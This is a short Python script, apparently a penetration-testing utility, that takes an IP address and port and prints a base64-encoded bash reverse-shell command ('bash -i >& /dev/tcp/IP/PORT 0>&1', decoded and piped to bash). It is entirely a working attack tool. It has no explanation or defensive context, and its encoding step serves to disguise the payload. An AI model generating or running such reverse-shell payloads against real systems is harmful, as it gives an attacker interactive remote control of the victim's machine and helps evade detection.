import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell base64 encoded payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

#/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
payload = "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'"
payload = payload % (ip, port)

cmdline = "echo " + base64.b64encode(payload) + "|base64 -d|bash"

print(cmdline)